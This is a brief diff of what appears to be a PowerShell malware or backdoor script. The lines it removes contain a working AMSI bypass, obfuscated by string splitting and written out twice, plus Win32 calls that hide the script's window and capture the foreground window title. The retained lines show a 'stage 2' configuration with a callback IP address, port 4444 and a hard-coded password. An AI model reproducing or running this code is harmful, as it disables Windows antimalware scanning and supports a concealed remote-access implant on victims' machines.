@@ -1,17 +1,3 @@
-$a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
-$a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
-$a = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
-$a.GetField('amsi' + 'InitFailed','NonPublic','Static').SetValue($null,$true)
-
-# Native API for Window Hiding and Forensics
-$api = Add-Type -Name Win32 -MemberDefinition @'
-[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
-[DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
-'@ -PassThru
-$api::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
-
-# --- STAGE 2: CONFIG ---
 $ip = '192.168.1.15'
 $port = 4444
 $pass = "biskviti"
